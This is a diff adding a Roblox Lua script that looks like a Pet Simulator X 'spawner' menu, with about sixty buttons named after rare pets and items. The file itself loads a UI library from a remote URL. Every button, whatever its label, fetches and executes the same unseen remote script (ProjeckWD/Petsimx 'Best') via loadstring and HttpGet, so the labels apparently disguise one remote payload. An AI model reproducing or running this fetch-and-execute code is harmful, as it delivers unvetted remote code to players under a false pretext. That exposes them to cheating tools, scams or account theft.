@@ -1,0 +1,249 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukezz/UTG-V4/main/Lib.lua"))()
+
+local Main_ = libary:CreateMain()
+
+Main_:CreateButton("Titanic Dominus Astra", "Corrupt Demonic Greatsword", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Titanic Cat", "Russos Sword of Truth", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Capybara", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Golden Huge Snowman", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Snowman", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Gold Huge Chest", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Floppa", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Prickly Panda", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Super Corgi", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Pony", "Shadow Blademasters Blade, Blademasters Blade", "Golden Demonic Greatsword, Corrupt Demonic Greatsword", "Frozen Demonic Greatsword, Demonic Greatsword", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Lucky Cat", "Motocross #62: Fire", "Motocross #77: The Sting", "Pink Ornament Earrings", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Comet Cyclop", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Chest", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Diamond Cat", "Pillow", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Meebo", "Ro Drone", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Santa Paws", "Trash Can", "Trash Cam Lid", "Destructive Aura", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Love Lamb", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Cupid Corgi", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Safari Cat", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Dominus", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Mrs. Claws", "Skateboard #12: Checker Chase", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Jolly Penguin", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Pixel Cat", "Robox, Brown Hair", "Chestnut Bun, Pal Hair", "Red Roblox Cap", "Lavender-Updo", "ROBLOX-Girl-Hair", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Lucki", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Orange Balloon Cat", "METAL x LIGHTSEER 77", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Grim Reaper", "METAL x LIGHTSEER 77", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Easter Cat", "Cyberpunk Sniper7", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Hacked Cat", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Festive Cat", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Pumpkin Cat", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Doodle Fairy", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Doodle Cat", "Witch Wizard Broom Classic", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Blue Balloon Cat", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Green Balloon Cat", "Type-40 Juggernauts Chain Gun", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Balloon Cat", "Type-9000 Minigun", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Santa Monkey", "Type-40 Juggernauts Chain Gun", "", "", "", "", function()
+	_G.CharacterBug = false
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Santa Dragon", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Banana", "Fiery-Fox-Shoulder-Pal", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Jolly", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Orca", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Pegasus", "Corrupt Demonic Greatsword", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Phoenix", "Red Stickman Head, International Fedora - USA", "International Fedora - Colombia", "International Fedora - Argentina", "International Fedora - Vietnam", "International Fedora - Brazil", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Golden Huge Hell Rock", "Red Stickman Head", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Hell Rock", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Banana", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Knife Cat", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Cupcake", "Oversized Hammer of the Titans", "Red Roblox Cap", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Pumpkin", "DB12 [Left Hip]", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Cat", "Pal Hair", "Red Roblox Cap", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Dog", "Flaming Mohawk", "Brown Hair", "Pal Hair", "Lavender Updo", "Chesnut Bun", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Monkey", "Demonic Greatsword", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Dragon", "ROBLOX Girl - Hair", "Chestnut Bun", "Brown Hair", "Pal Hair", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Scary Cat", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Scary Corgi", "Saber Simulator: Red Light Saber", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Skeleton", "Slasher", "Fan Hand Sign - Why Don't We (WDW)", "International Fedora - Germany", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Agony", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Ducky", "Grill", "Burger Bob", "Grilled Sausage", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Axolotl", "None", "", "", "", "", function()
+	_G.KeyCode = "X"
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Corgi", "Le Rouge Cross-body Bag 1.0", "Nike Shoebox Costume", "Head Slime", "Spider Cola", "The Bird Says____.", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Reindeer Axolotl", "None", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
+
+Main_:CreateButton("Huge Reindeer Dog", "Slasher", "", "", "", "", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjeckWD/Petsimx/main/Best"))()
+end)
